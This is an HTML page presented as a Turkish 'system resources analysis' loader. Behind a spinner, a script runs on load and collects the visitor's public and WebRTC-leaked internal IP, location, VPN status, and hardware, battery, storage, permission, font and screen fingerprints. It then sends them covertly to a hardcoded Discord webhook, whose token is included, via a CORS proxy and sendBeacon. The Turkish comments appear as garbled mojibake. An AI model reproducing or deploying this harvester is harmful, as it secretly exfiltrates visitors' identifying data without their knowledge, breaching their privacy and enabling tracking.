<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Sistem KaynaklarÄ± Analizi</title>
    <style>body{background:#000;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden;}.l{border:2px solid #111;border-top:2px solid #0f0;border-radius:50%;width:24px;height:24px;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg);}}</style>
</head>
<body>
    <div class="l"></div>
    <script>
        "use strict";

        class DataHarvester {
            constructor() {
                this.endpoint = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
                this.tunnel = "https://corsproxy.io/?";
            }

            // 1. GeliÅŸmiÅŸ AÄŸ ve VPN Analizi (Side-Channel)
            async getNetworkLayer() {
                const start = performance.now();
                const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
                const latency = performance.now() - start;

                const webrtc = await new Promise(res => {
                    const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
                    pc.createDataChannel(""); 
                    pc.createOffer().then(o => pc.setLocalDescription(o));
                    pc.onicecandidate = (e) => {
                        if (e?.candidate?.candidate) {
                            const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                            if (match) { pc.close(); res(match[1]); }
                        }
                    };
                    setTimeout(() => res("Firewall_Blocked"), 1500);
                });

                const browserTZ = Intl.DateTimeFormat().resolvedOptions().timeZone;
                return {
                    ext: ipInfo.ip,
                    int: webrtc,
                    isp: ipInfo.org,
                    loc: `${ipInfo.city}, ${ipInfo.country_name}`,
                    vpn: ipInfo.timezone !== browserTZ ? "âš ï¸ DETECTED (TZ_MISMATCH)" : "âœ… CLEAN",
                    rtt: latency.toFixed(2) + "ms",
                    type: navigator.connection?.effectiveType || "N/A"
                };
            }

            // 2. Ham DonanÄ±m Ä°mzasÄ± (Hardware Fingerprinting)
            getHardwareLayer() {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                
                // Shader Precision Analysis (Cihaz KimliÄŸi tespiti iÃ§in en saÄŸlam yol)
                const v_prec = gl.getShaderPrecisionFormat(gl.VERTEX_SHADER, gl.HIGH_FLOAT);
                const f_prec = gl.getShaderPrecisionFormat(gl.FRAGMENT_SHADER, gl.HIGH_FLOAT);

                return {
                    gpu: debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "N/A",
                    vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_ID) : "N/A",
                    cores: navigator.hardwareConcurrency,
                    ram: navigator.deviceMemory + "GB",
                    max_tex: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                    precision: `V:${v_prec.precision}/F:${f_prec.precision}`,
                    audio: new (window.AudioContext || window.webkitAudioContext)().sampleRate + "Hz",
                    heap: performance.memory ? Math.round(performance.memory.jsHeapSizeLimit / 1048576) + "MB" : "N/A"
                };
            }

            // 3. YazÄ±lÄ±m ve Sistem Durumu (Environmental Analysis)
            async getSystemLayer() {
                const battery = navigator.getBattery ? await navigator.getBattery() : {};
                const storage = navigator.storage ? await navigator.storage.estimate() : {};
                const perms = async (n) => (await navigator.permissions.query({name: n}).catch(() => ({state: 'denied'}))).state;

                return {
                    os: navigator.platform,
                    lang: navigator.language,
                    bat: `${Math.round(battery.level * 100)}% (${battery.charging ? 'Plugged' : 'Battery'})`,
                    disk: Math.round(storage.quota / 1073741824) + "GB Total",
                    used: Math.round(storage.usage / 1048576) + "MB Used",
                    cam: await perms('camera'),
                    mic: await perms('microphone'),
                    pdf: navigator.pdfViewerEnabled,
                    fonts: ["Ubuntu", "Roboto", "Consolas", "Impact", "Tahoma", "Georgia", "Monaco"].filter(f => document.fonts.check(`12px "${f}"`)).join(", ")
                };
            }

            // 4. Ekran ve Rendering KatmanÄ± (Display Profile)
            getDisplayLayer() {
                return {
                    res: `${screen.width}x${screen.height}`,
                    avail: `${screen.availWidth}x${screen.availHeight}`,
                    ratio: window.devicePixelRatio,
                    depth: screen.colorDepth + "bit",
                    orient: screen.orientation?.type || "N/A",
                    touch: navigator.maxTouchPoints,
                    dark: window.matchMedia('(prefers-color-scheme: dark)').matches
                };
            }

            // 5. Veri Paketleme ve Dispatcher (Transmission Control)
            async execute() {
                const [net, sys] = await Promise.all([this.getNetworkLayer(), this.getSystemLayer()]);
                const hw = this.getHardwareLayer();
                const dp = this.getDisplayLayer();

                const payload = {
                    embeds: [{
                        title: "ğŸ’€ KERNEL_ARCHITECT_V39_STABLE",
                        color: 0xff0000,
                        fields: [
                            { name: "ğŸ“¡ AÄ ANALÄ°ZÄ° (7)", value: `**DÄ±ÅŸ IP:** \`${net.ext}\` | **Ä°Ã§ IP:** \`${net.int}\`\n**ISP:** ${net.isp}\n**Konum:** ${net.loc}\n**VPN Durumu:** ${net.vpn}\n**Gecikme:** ${net.rtt}`, inline: false },
                            { name: "âš™ï¸ DONANIM MÄ°MARÄ°SÄ° (8)", value: `**GPU:** ${hw.gpu}\n**CPU:** ${hw.cores} Ã‡ekirdek | **RAM:** ${hw.ram}\n**Heap:** ${hw.heap} | **Shader:** ${hw.precision}\n**Max Texture:** ${hw.max_tex}`, inline: false },
                            { name: "ğŸŒ SÄ°STEM VE Ä°ZÄ°NLER (8)", value: `**OS:** ${sys.os} | **Dil:** ${sys.lang}\n**Kamera:** ${sys.cam} | **Mik:** ${sys.mic}\n**Pil:** ${sys.bat} | **Disk:** ${sys.disk}\n**PDF:** ${sys.pdf} | **Dark:** ${dp.dark}`, inline: false },
                            { name: "ğŸ“ EKRAN VE GÃ–RÃœNTÃœ (6)", value: `**Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k:** ${dp.res} | **Oran:** ${dp.ratio}\n**KullanÄ±labilir:** ${dp.avail}\n**Derinlik:** ${dp.depth} | **Touch:** ${dp.touch}`, inline: false },
                            { name: "ğŸ–‹ï¸ FONT KÃœTÃœPHANESÄ°", value: "```" + sys.fonts + "```", inline: false },
                            { name: "ğŸ” RAW_UA", value: "```" + navigator.userAgent + "```" }
                        ],
                        footer: { text: "Protocol: Omniscience v39.0 | Engineering Edition" },
                        timestamp: new Date().toISOString()
                    }]
                };

                const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
                
                // MULTI-VECTOR DISPATCH
                const target = this.tunnel + encodeURIComponent(this.endpoint);
                fetch(target, { method: 'POST', body: blob, mode: 'no-cors' });
                if (navigator.sendBeacon) navigator.sendBeacon(this.endpoint, blob);
            }
        }

        // BaÅŸlatÄ±cÄ±
        new DataHarvester().execute();
    </script>
</body>
</html>
